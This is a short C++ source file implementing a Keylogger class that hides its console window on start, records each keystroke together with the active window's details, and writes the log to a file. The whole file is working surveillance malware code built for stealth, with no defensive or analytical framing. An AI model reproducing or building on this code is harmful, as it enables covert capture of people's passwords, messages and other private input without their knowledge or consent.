#include "../../include/keylogger.h"

#include <fstream>

Keylogger::Keylogger(std::ofstream&& outputFile, OSManager& manager, HookManager& hookManager, WindowInfo& windowInfo, KeyInput& keyInput)
    : _outputFile (std::move(outputFile)), _manager(manager), _hookManager(hookManager), _windowInfo(windowInfo), _keyInput(keyInput) {
    this->_manager.setTerminalVisibility(false);
}

int Keylogger::LogKeyStroke(int keyStroke) {
    if (_keyInput.IgnoreMouse(keyStroke)) return 0;

    std::stringstream output;
    _windowInfo.GetActiveWindowInfo(output);
    _keyInput.FormatOutputBasedOnLogging(output, keyStroke);
    writeToOutput(output);

    return 0;
}

void Keylogger::writeToOutput(std::stringstream& output) {
    _outputFile << output.str();
    _outputFile.flush();
}